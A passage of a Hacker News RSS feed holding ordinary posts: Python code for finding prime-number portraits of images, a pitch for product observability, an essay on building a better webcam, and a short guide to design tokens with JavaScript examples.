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 rkJggg=="></p>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Helper-functions">Helper functions</h2>
<p>I had to create some helper functions to return strings, integers, and load and show images.</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>image_to_number</span><span>(</span><span>numbered_image</span><span>):</span>
    <span>to_be_number</span> <span>=</span> <span>numbered_image</span><span>.</span><span>reshape</span><span>(</span><span>-</span><span>1</span><span>)</span>
    <span>as_string</span> <span>=</span> <span>''</span><span>.</span><span>join</span><span>([</span><span>str</span><span>(</span><span>int</span><span>(</span><span>x</span><span>))</span> <span>for</span> <span>x</span> <span>in</span> <span>to_be_number</span><span>])</span>
    <span>as_int</span> <span>=</span> <span>int</span><span>(</span><span>as_string</span><span>)</span>
    <span>return</span> <span>as_int</span><span>,</span> <span>as_string</span>


<span>def</span> <span>show_and_save_image</span><span>(</span><span>image</span><span>,</span> <span>n_image</span><span>,</span> <span>filename</span><span>,</span> <span>fontsize</span><span>=</span><span>16</span><span>):</span>
    <span>oldshape</span> <span>=</span> <span>image</span><span>.</span><span>shape</span>
    <span>resized_image</span><span>=</span> <span>scipy</span><span>.</span><span>misc</span><span>.</span><span>imresize</span><span>(</span><span>image</span><span>,(</span><span>oldshape</span><span>[</span><span>0</span><span>]</span><span>*</span><span>fontsize</span><span>,</span> <span>oldshape</span><span>[</span><span>1</span><span>]</span><span>*</span><span>fontsize</span><span>),</span> <span>interp</span><span>=</span><span>'nearest'</span><span>)</span>
    <span>img</span> <span>=</span> <span>Image</span><span>.</span><span>fromarray</span><span>(</span><span>resized_image</span><span>)</span><span>.</span><span>convert</span><span>(</span><span>"RGBA"</span><span>)</span>
    <span>txt</span> <span>=</span> <span>Image</span><span>.</span><span>new</span><span>(</span><span>'RGBA'</span><span>,</span> <span>img</span><span>.</span><span>size</span><span>,</span> <span>(</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>0</span><span>))</span>

    <span>draw</span> <span>=</span> <span>ImageDraw</span><span>.</span><span>Draw</span><span>(</span><span>txt</span><span>)</span>
    <span>font</span> <span>=</span> <span>ImageFont</span><span>.</span><span>truetype</span><span>(</span><span>"pirulen rg.ttf"</span><span>,</span> <span>fontsize</span><span>)</span>
    <span>for</span> <span>y_i</span><span>,</span> <span>totype</span> <span>in</span> <span>enumerate</span><span>(</span><span>n_image</span><span>):</span>
        <span>for</span> <span>x_i</span><span>,</span> <span>letter</span> <span>in</span> <span>enumerate</span><span>(</span><span>totype</span><span>):</span>
            <span>xpos</span> <span>=</span> <span>x_i</span> <span>*</span> <span>fontsize</span> <span>+</span> <span>1</span>
            <span>ypos</span> <span>=</span> <span>y_i</span> <span>*</span> <span>fontsize</span>
            <span>if</span> <span>letter</span> <span>==</span> <span>1</span><span>:</span>
                <span>xpos</span> <span>+=</span> <span>4</span>
            <span>draw</span><span>.</span><span>text</span><span>((</span><span>xpos</span><span>,</span> <span>ypos</span><span>),</span><span>str</span><span>(</span><span>letter</span><span>),(</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span> <span>128</span><span>),</span><span>font</span><span>=</span><span>font</span><span>)</span>
    <span>img</span> <span>=</span> <span>Image</span><span>.</span><span>alpha_composite</span><span>(</span><span>img</span><span>,</span> <span>txt</span><span>)</span>    

    <span>img</span><span>.</span><span>save</span><span>(</span><span>filename</span><span>)</span>
    <span>plt</span><span>.</span><span>figure</span><span>(</span><span>figsize</span><span>=</span><span>(</span><span>20</span><span>,</span><span>20</span><span>))</span>
    <span>plt</span><span>.</span><span>imshow</span><span>(</span><span>img</span><span>)</span>
    <span>plt</span><span>.</span><span>show</span><span>()</span>

<span>def</span> <span>result_filename</span><span>(</span><span>filename</span><span>):</span>
    <span>return</span> <span>filename</span><span>.</span><span>split</span><span>(</span><span>'.'</span><span>)[</span><span>0</span><span>]</span> <span>+</span> <span>"-prime.png"</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<p>To verify if something is a good prime portrait I made the following helper functions:</p>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>is_good_prime_portrait</span><span>(</span><span>n_image</span><span>):</span>
    <span>integer</span><span>,</span> <span>string</span> <span>=</span> <span>image_to_number</span><span>(</span><span>n_image</span><span>)</span>
    <span>if</span> <span>is_probable_prime</span><span>(</span><span>integer</span><span>):</span> 
        <span>return</span> <span>integer</span><span>,</span> <span>string</span><span>,</span> <span>n_image</span>
    <span>else</span><span>:</span>
        <span>return</span> <span>None</span>
    
    
<span>def</span> <span>print_result</span><span>(</span><span>string</span><span>,</span> <span>n_image</span><span>):</span>
    <span>print</span><span>(</span><span>string</span><span>)</span>
    <span>print</span><span>(</span><span>"-"</span><span>*</span><span>100</span><span>)</span>
    <span>for</span> <span>line</span> <span>in</span> <span>n_image</span><span>:</span>
        <span>print</span><span>(</span><span>''</span><span>.</span><span>join</span><span>([</span><span>str</span><span>(</span><span>x</span><span>)</span> <span>for</span> <span>x</span> <span>in</span> <span>line</span><span>]))</span>
</pre>
</div>
</div>
</div>
</div>
</div>
<div>

<div>
<div>
<h2 id="Multi-threaded-searching">Multi threaded searching</h2>
<p>At first I created a single-threaded solution, which worked. However, my laptop has multiple cores and could work on multiple numbers at the same time, so I rewrote my initial approach in a multi-threaded fashion:</p>
</div>
</div>
</div>
<div>
<div>
<div>
<div>
<div>
<pre><span>def</span> <span>print_result</span><span>(</span><span>string</span><span>,</span> <span>n_image</span><span>):</span>
    <span>print</span><span>(</span><span>"Found a result: "</span> <span>+</span> <span>"-"</span><span>*</span><span>100</span><span>)</span>
    <span>print</span><span>(</span><span>string</span><span>)</span>
    <span>print</span><span>(</span><span>"Represented as portrait:"</span> <span>+</span> <span>"-"</span><span>*</span><span>100</span><span>)</span>
    <span>for</span> <span>line</span> <span>in</span> <span>n_image</span><span>:</span>
        <span>print</span><span>(</span><span>''</span><span>.</span><span>join</span><span>([</span><span>str</span><span>(</span><span>x</span><span>)</span> <span>for</span> <span>x</span> <span>in</span> <span>line</span><span>]))</span>

<span>def</span> <span>multi_threaded_prime_generator</span><span>(</span><span>resized_image</span><span>,</span> <span>kmeans</span><span>,</span> <span>filename</span><span>,</span> <span>threads</span><span>=</span><span>4</span><span>,</span> <span>log_process</span><span>=</span><span>True</span><span>):</span>
    <span>image_generator</span> <span>=</span> <span>(</span><span>create_numbered_image</span><span>(</span><span>resized_image</span><span>,</span> <span>kmeans</span><span>)</span> <span>for</span> <span>_</span> <span>in</span> <span>range</span><span>(</span><span>1000000</span><span>))</span>
    <span>start</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span> 
    <span>with</span> <span>Pool</span><span>(</span><span>threads</span><span>)</span> <span>as</span> <span>pool</span><span>:</span>
        <span>results</span> <span>=</span> <span>pool</span><span>.</span><span>imap_unordered</span><span>(</span><span>is_good_prime_portrait</span><span>,</span> <span>image_generator</span><span>)</span>
        <span>total_results</span> <span>=</span> <span>0</span>
        
        <span>for</span> <span>result</span> <span>in</span> <span>results</span><span>:</span>
            <span>total_results</span> <span>+=</span> <span>1</span>
            
            <span># Possibly log time spend searching this prime number</span>
            <span>if</span> <span>log_process</span> <span>and</span> <span>total_results</span><span>%</span><span>30</span><span>==</span><span>0</span><span>:</span>
                <span>elapsed</span> <span>=</span> <span>time</span><span>.</span><span>time</span><span>()</span>
                <span>elapsed</span> <span>=</span> <span>elapsed</span> <span>-</span> <span>start</span>
                <span>print</span><span>(</span><span>"Seconds spent in (function name) is </span><span>{}</span><span> time per result: </span><span>{}</span><span>"</span><span>.</span><span>format</span><span>(</span><span>str</span><span>(</span><span>elapsed</span><span>),</span> <span>str</span><span>(</span><span>elapsed</span><span>/</span><span>total_results</span><span>)))</span>

                
            <span>if</span> <span>result</span> <span>!=</span> <span>None</span><span>:</span> 
 â€¦</pre></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.pinchofintelligence.com/painting-by-prime-number/">http://www.pinchofintelligence.com/painting-by-prime-number/</a></em></p>]]>
            </description>
            <link>http://www.pinchofintelligence.com/painting-by-prime-number/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504887</guid>
            <pubDate>Tue, 22 Dec 2020 10:36:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[From product analytics to product observability]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504778">thread link</a>) | @bastienbeurier
<br/>
December 22, 2020 | https://www.lantern.so/blog/from-product-analytics-to-product-observability | <a href="https://web.archive.org/web/*/https://www.lantern.so/blog/from-product-analytics-to-product-observability">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Early ventures don't start with optimization. You begin with a big, bold bet that whatever youâ€™re going to make will cause a revolution. Your product goes through several iterations, entirely transforming throughout the process. You test the strength of a founder's dream.</p><p>Products at this stage are simple, characterized by one 'killer' feature. Often the product doesn't have the chance to fulfill the advertised value and that's okay. The goal at this stage is to validate the appetite of the users: attract them, disappoint them, and leave them hungry for more.</p><p>Product development in this context is chaotic. No roadmap, mostly negative feedback, no clear sense of progress, and definitely no certainty when the next pivot will come. No one knows how the product will look in a month. It's the 'build things that don't scale' phase, taking shortcuts that somewhat work and dealing with most problems later.</p><p>This is where your headlight comes in: product analytics. You use product analytics to drill down what works and what doesn't. Product analytics also tell you if people are actually using your product: you choose a 'North Star' metric that guides your company in the right direction and tells you if your efforts are bearing fruit.</p><p>Then, the company moves on to the next phase. The road ahead becomes clear, product development becomes more linear, and the product itself stabilizes. It's all about doing more of the same thing. You start to build things that scale. It's the beginning of the optimization phase.</p><p>Your roadmap is clearer, traffic grows, the product becomes more and more complex and dynamic. A variety of variables start to influence the way your product performs: marketing, sales, product development, customer success, support, business development, partnerships, promotions, etc.</p><p>You realize all of a sudden the data that helped you find your feet is overwhelming you. You're swimming in data from more and more sources about how your user-base is growing, how people are interacting with your brand and your product. As your data stack grows larger and your dashboards multiply, you start getting the feeling that youâ€™re missing something vital.</p><p>In this fast-growing deluge of data, a missing piece comes into play: product observability. Product observability keeps track of user behavior all the time, at the finest level of granularity to the highest level of abstraction.</p><p>There are many reasons why people change their behavior. Adjustments to the product, holidays, a new offering from a competitor, changing habits, etc. Product observability is capable of spotting those changes and flagging the issue as a problem or, perhaps, an opportunity. Product observability analyzes all your data all the time, noticing the finest-grained changes to overarching trends.</p><p>Product observability is proactive. Product observability informs you that something needs your attention due to a change in user behavior. Or, you learn that what you're doing is working really well and you need to double-down on your efforts. You get details on the origin of the changes and the impact it could have on your business.</p><p>Once you've reached the market with your product, you already know that you're creating value for people. But now the question becomes how much value can you capture? And for how many users? Product observability optimizes your product's ability to create value by automatically giving you feedback on what you need to fix and keep on doing.</p><p>If youâ€™re interested in trying proactive analytics, sign up for Lantern's early access program <a href="https://lantern.so/">here</a>.</p></div></div><div><div><div><p>Subscribe to our newsletter</p><div><div><p>Thank you! Your submission has been received!</p></div><div><p>Oops! Something went wrong while submitting the form.</p></div></div><div><h4>About</h4><p>Ideas and advice on how to leverage analytics in modern product teams.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.lantern.so/blog/from-product-analytics-to-product-observability</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504778</guid>
            <pubDate>Tue, 22 Dec 2020 10:17:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why canâ€™t you buy a good webcam?]]>
            </title>
            <description>
<![CDATA[
Score 734 | Comments 732 (<a href="https://news.ycombinator.com/item?id=25504771">thread link</a>) | @murkt
<br/>
December 22, 2020 | https://vsevolod.net/good-webcams/ | <a href="https://web.archive.org/web/*/https://vsevolod.net/good-webcams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <p>Some people are not satisfied with a webcam from their notebook or an old webcam
they bought many years ago.</p>
<p>My brother decided he wants to try streaming. Some people can just do a thing
and other people want to research all the bits and pieces beforehand. Our chat
history is comparable in length to all my other chats combined, so I learned a
lot of it as well. The craft is full with small details and inconveniences.</p>
<p>He found that there are basically no good webcams. A lot of the time an image
quality is meh, and the rare presence of 4k is usually not better than 1080p,
because resolution is not quality. Some camera apparently does upscaling from
1080p to 4k in its driver, indicated by poor quality and high CPU load. He also
has a really good camera, Fujifilm X-T1. It can't be used as a webcam when
connected to a USB port. Usually it's possible to buy an HDMI-to-USB converter,
but his camera can't output a live stream into HDMI, only a recorded video.</p>
<p>So we had an idea â€” maybe it is possible to create a good webcam
ourselves. Would anybody care? Well, itâ€™s almost 2021 now, streaming is still on
the rise, pandemic is going strong and video meetings are everywhere. People are
willing to spend some money, as indicated by countless videos on YouTube
regarding the problem.</p>
<p>Letâ€™s start with defining what is a good webcam.</p>
<p>A good webcam, in my opinion, is a device that provides a decent sound quality,
at least on par with recent MacBooks, and an image quality on par with top
smartphones, such as iPhone 11/12, Huawei P40 Pro, etc. As smartphones have a
good image quality, then we could probably manufacture a webcam from smartphone
parts that are cheap and easily available. How hard can it be?</p>
<p>If youâ€™ve read at least a couple of articles on the topic of video production,
you will know that to make quality content from the technical standpoint you
need three things, in that particular order:</p>
<ol>
<li>Sound</li>
<li>Light</li>
<li>Video quality</li>
</ol>
<p>Let's discuss these properties and later how to manufacture it.</p>
<h3 id="sound">Sound<a href="#sound" aria-label="Anchor link for: sound">ğŸ”—</a></h3>
<p>If you have a recent MacBook, it provides a decent sound quality with its
three-mic array. I haven't researched it and donâ€™t know much about other
notebooks' audio quality. If you have a desktop PC, you have to have some
external mic anyway.</p>
<p>If the web camera has shitty audio quality, youâ€™ll have to buy additional
gear. When I researched the topic, one of the recently released webcams
(available from October 2020) with RRP of $180 was producing a sound as if a
person sits in a big plastic barrel with a closed lid. Their voice was very
muffled with lots of resonant rattles. That level of quality wasnâ€™t acceptable
10 years ago, how this piece of gear could have been produced in 2020 escapes my
understanding.</p>
<p>There are many good enough USB mics for $50+, you also can buy a great XLR
microphone for $100, but then youâ€™ll need an external sound card with phantom
power supply. A decent one can easily cost you $200.</p>
<p>With almost any of these options youâ€™ll have to install and configure some
software that will provide sound level compression, noise suppression (because
your notebook fans are spinning like hell) and wonâ€™t produce clicks in the
process.</p>
<p>I would like my webcam to do this by itself, no rattling, minimized echo, etc.</p>
<h3 id="light">Light<a href="#light" aria-label="Anchor link for: light">ğŸ”—</a></h3>
<p>A lot of what makes a picture great comes from lighting the scene in a correct way.</p>
<p>The simplest thing is to sit in a room so the window is in front of you and the
Sun isnâ€™t shining into a lens from behind your shoulder.</p>
<p>Webcam cannot provide decent lighting capabilities by itself, so I wonâ€™t spend
much time here. There is a <a href="https://www.razer.com/streaming-cameras/razer-kiyo/RZ19-02320100-R3M1">webcam by
Razer</a>
with a built-in LED circle, but itâ€™s necessarily small, always shines from a
webcam direction and is mostly a gimmick.</p>
<p>We can rely somewhat on the good sensor here. If it provides good dynamic range,
HDR capabilities and good low-light performance, then a patch of sunlight on the
wall won't turn everything else black, or a poorly lit room won't turn into a
gray noisy picture with a bleak silhouette.</p>
<h3 id="image-quality">Image quality<a href="#image-quality" aria-label="Anchor link for: image-quality">ğŸ”—</a></h3>
<p>Itâ€™s impossible to get a good lens and image sensor into a notebook lid, because
lids are very thin. Theyâ€™re often something like 4 mm thick all together, and
there is no escaping physics. Of course, it's possible to put a webcam into a
thick part below the lid, but then it'll be useful for expressing anger at our
colleagues with wide-open nostrils and not much else.</p>
<p>Maybe some crazy engineer in the future will develop an array of small sensors
with an array of tiny lenses and somehow combine all that into a good image
quality, but we don't have this tech yet. Any smartphone with a good camera has
that camera with an ugly protruding lens as a thickest part of the phone.</p>
<p>So, if you want something better than a notebook's webcam, you can get some
Logitech webcam with an image quality going back to 2012. Itâ€™s still better than
a laptop, but nowhere close to current smartphones.</p>
<p>What if you want better still? The next option is to install an app on the phone
and use it as a webcam. This gives a very good image quality, but itâ€™s very
inconvenient and in some applications doesnâ€™t work at all. For some reason it
isnâ€™t always presented in applications as an option when choosing a video
source.</p>
<p>I donâ€™t want to constantly attach, detach, charge my phone and tune the position of
a small tripod. Whatâ€™s the next option?</p>
<p>The next option is to just buy a mirrorless photo-camera with a big fat 4/3â€ or
even APS-C sensor. It will cost $500+ for a new one (you can buy used for
cheaper). You will also need some gear to hold the camera in place, as it wonâ€™t
just rest on the top of the screen like a regular webcam. You also need an
HDMI-to-USB video grabber, and you need to be sure that the camera you buy can
output full resolution live onto that HDMI. Also make sure that it's possible to
turn off all on-screen info like <code>1/100s F3.5 ISO 800</code>, which is useful when
you're shooting photos and videos through viewfinder, but not so much when
you're in a video meeting. This feature is called "Clean HDMI".</p>
<p>Of course, you will have a lot of control over the whole stuff â€” set a
diaphragm, get good bokeh, set ISO, set white balance, etc. Do you actually need
it? Well, some of you do, and a lot of you do not. I learned all that stuff when
I was 16, but now Iâ€™m pretty happy with how my phone chooses everything for me
and just does great photos.</p>
<p>All that sounds pretty involved, isnâ€™t it? It is a lot of time to research what
you need, how to set it all up, and a lot of money too.</p>
<h3 id="manufacturing-it">Manufacturing it<a href="#manufacturing-it" aria-label="Anchor link for: manufacturing-it">ğŸ”—</a></h3>
<p>So there is a market gap between so-so webcams for $100-200 and a full-blown
setup with a mirrorless camera, an external mic and lighting panels that will
cost almost a grand or two, if you're so inclined.</p>
<p>I thought that it is a good idea to create an "upmarket" webcam for $250-300
that will provide good audio and video quality, on par with current smartphones,
actually using the same parts. As smartphones are made in tens of millions, all
relevant parts should be cheap and easily obtainable.</p>
<p>I quickly contacted some people who could help me do the project â€” firmware
engineer, electric engineer and a company that does mechanical design.</p>
<p>What features are needed for a good webcam for streamers and video meetings?
Audio: good parts (mics and ADC), good mechanical design and assembly (so
nothing would rattle), and some post-processing. We certainly want some
beam-forming capabilities to be able to focus on the person in front of the
webcam, so we will need more than one microphone, maybe up to 4. These parts are
easy to obtain, there are many in stock, it's not a problem.</p>
<p>Even if I think that 4k is not needed, Iâ€™m pretty sure itâ€™s really a requirement
to have in an upmarket webcam, as it will be really hard to sell a pricey webcam
that can only do 1080p.</p>
<p>Also would be very nice to have some neural network inference on the chip, so we
can run some AI stuff directly on the webcam without bothering a userâ€™s computer
that can be busy with other things.</p>
<p>I easily found a three-piece assembly for the iPhone 11 Pro for fifty bucks,
two-piece from a Huawei P40 Pro for twenty five and a one-piece from P40 Lite for
ten dollars. Thatâ€™s with a lens, and bought in retail. Does it mean it costs
peanuts (less than $5 for a sensor) to buy in bulk to produce my own webcam?
Well... Maybe. I canâ€™t just go and buy a couple thousands of these sensors. Iâ€™m
pretty sure I can buy a couple thousands of replacement parts for phones, but
sensors themselves are not sold freely. It's easy to buy some "random" sensor
that was around for years and most certainly has "meh" quality by today's
standards, but we need a good one, with good dynamic range, HDR capabilities and
low-light performance.</p>
<p>I wrote to several vendors asking them what are the prices and conditions, and
basically their answer is either silence or â€œweâ€™ll sell it if you will buy
hundreds of thousands per yearâ€.</p>
<p>I've found suitable System-on-Chips, and it's the same â€” if we want to have
hardware 4k encoder, it's either "sorry, it was a demo part and we don't do it",
or "we have limited support capabilities, so we can only sell if you will buy
hundreds of thousands, maybe you want some SoMs from our partners?". It is
actually possible to buy System-on-Modules even in very small quantities, but
it's going to be pretty expensive and will be good for a prototype, but for
production it will blow past our budget. System-on-Module will cost almost the
same as the web camera itself.</p>
<p>Oh, and a lead time (from order to shipment) is systematically 16+ weeks. It
means they have no stock and will place an order at semiconductor foundry, have
it produced, packaged and sent to customer. Swiftly.</p>
<p>It means I cannot just build five hundred webcams, see how good are they selling
and build a couple thousand, and so on.</p>
<p>There is also a plastic injection step that requires upfront investment to
manufacture molds, and of course design and engineering costs. All combined it
was tens of thousands â€¦</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vsevolod.net/good-webcams/">https://vsevolod.net/good-webcams/</a></em></p>]]>
            </description>
            <link>https://vsevolod.net/good-webcams/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504771</guid>
            <pubDate>Tue, 22 Dec 2020 10:16:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where to Start with Design Tokens]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504704">thread link</a>) | @sanctioned
<br/>
December 22, 2020 | https://maecapozzi.com/where-to-start-with-design-tokens/?ref=heydesigner | <a href="https://web.archive.org/web/*/https://maecapozzi.com/where-to-start-with-design-tokens/?ref=heydesigner">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>If youâ€™ve been researching design systems, youâ€™ve probably come across the term â€œdesign tokens.â€ (If you havenâ€™t, no worries! You can read about them <a href="https://maecapozzi.com/design-tokens">here</a>.) Even if youâ€™ve heard the term, you might not really understand what they are or where to start.</p>
<p><strong>Design tokens are an approach to storing style attributes like color, typography, and spacing in a pre-determined structure. They are an alternative to directly hard-coding style data that allow designers and developers to build consistent, pleasing layouts, quickly accomplish redesigns, and add a theming layer to their applications.</strong></p>
<p>In my opinion, design tokens are a great way to dip your toes into the world of design systems. I like to think of a design system as a having <a href="https://maecapozzi.com/layers-of-abstraction-in-design-systems">5 layers to it</a>. The smallest building block of that system (or the first layer) is design tokens.</p>
<p>Usually when designers and developers start work on an app, they donâ€™t create a centralized and structured way to organize style data like colors and fonts. This is totally fine for few years, but eventually the team runs into one of the following issues:</p>
<ul>
<li>Marketing wants to redesign the site, but hard-coded colors across design files and codebase are too difficult to keep track of or change
<br></li>
<li>The team wants to add a feature like dark mode, but realizes itâ€™s really difficult without centralized style data
<br></li>
<li>The team wants to start supporting multiple applications without building each one entirely from scratch</li>
</ul>
<p>So once you find yourself in this situation, what do you do?</p>
<h2>1. Decide to invest in design tokens</h2>
<p>The first step is recognizing that design tokens are a great tool for addressing the three situations listed above. At this point, youâ€™ll need to encourage your team to invest in researching and implementing design tokens.</p>
<h2>2. Educate and socialize</h2>
<p>Itâ€™s more than likely that some of your teammates will never have heard of design tokens. Youâ€™ll need to begin to educate them on the value of the tool, and encourage them to do their own research. You can use <a href="https://theme-ui.com/demo" target="_blank" rel="nofollow noopener noreferrer">Theme UIâ€™s demo</a> to help make your case, or you can create your own proof-of-concept.</p>
<h2>3. Choose how youâ€™ll implement your tokens</h2>
<p>You have a couple of options for how to implement your tokens. A lot of teams choose to implement their own structure and naming scheme. This approach prevents your team from having to depend on an external library. The key is to make sure that your tokens are named really generically! Take a look at examples from companies like Salesforce to get ideas for how to structure your tokens. I write about this topic in more depth <a href="https://maecapozzi.com/design-tokens">here</a> if you are interested.</p>
<p>You also have the option to use a third-party library like <a href="https://theme-ui.com/home" target="_blank" rel="nofollow noopener noreferrer">Theme UI</a>. Theme UI lets you implement your tokens according to their <a href="https://theme-ui.com/theme-spec" target="_blank" rel="nofollow noopener noreferrer">Theme Specification</a> and offers you some helpful syntactic sugar like their <code>sx</code> prop and <code>variants</code> key to make using your tokens easier. Even if the library isnâ€™t for you, you can use the Theme Specification as inspiration.</p>
<h2>4. Implement the tokens</h2>
<p>At this point, youâ€™ll work with designers on the team to agree on naming and structure for the tokens, and youâ€™ll create an object with that contains your structured style data. The final step is to configure the components in your application to read from the tokens instead of from hardcoded values.</p>
<p>So if your tokens look like this:</p>
<div data-language="js"><pre><code><span>const</span> theme <span>=</span> <span>{</span>
  colors<span>:</span> <span>{</span>
    primary<span>:</span> <span>"pink"</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span></code></pre></div>
<p>Your components would no longer look like this:</p>
<div data-language="jsx"><pre><code><span>const</span> Nav <span>=</span> <span>styled</span><span>(</span><span>"nav"</span><span>)</span><span><span>`</span><span>
  color: pink;
</span><span>`</span></span><span>;</span></code></pre></div>
<p>They would instead read from the theme object:</p>
<div data-language="jsx"><pre><code><span>const</span> Nav <span>=</span> <span>styled</span><span>(</span><span>"nav"</span><span>)</span><span><span>`</span><span>
  color: </span><span><span>${</span><span>(</span><span>props</span><span>)</span> <span>=&gt;</span> props<span>.</span>theme<span>.</span>colors<span>.</span>primary<span>}</span></span><span>;
</span><span>`</span></span><span>;</span></code></pre></div>
<p>Now, if you change the values of your tokens:</p>
<div data-language="js"><pre><code><span>const</span> theme <span>=</span> <span>{</span>
  colors<span>:</span> <span>{</span>
    primary<span>:</span> <span>"green"</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span></code></pre></div>
<p>You no longer need to update the styles in your component.</p>
<hr>
<p>Are you researching design tokens for something youâ€™re building? What are you stuck on? Iâ€™d love to hear from you. You can reach me on <a href="https://twitter.com/MCapoz" target="_blank" rel="nofollow noopener noreferrer">Twitter</a> or by responding to any of my newsletter messages. (Seriously, I really want to hear from you.)</p></div></div></div>]]>
            </description>
            <link>https://maecapozzi.com/where-to-start-with-design-tokens/?ref=heydesigner</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504704</guid>
            <pubDate>Tue, 22 Dec 2020 10:06:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designer as Writer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504677">thread link</a>) | @omarchowdhury
<br/>
December 22, 2020 | https://stasaki.com/designer-as-writer/ | <a href="https://web.archive.org/web/*/https://stasaki.com/designer-as-writer/">archive.org</a>
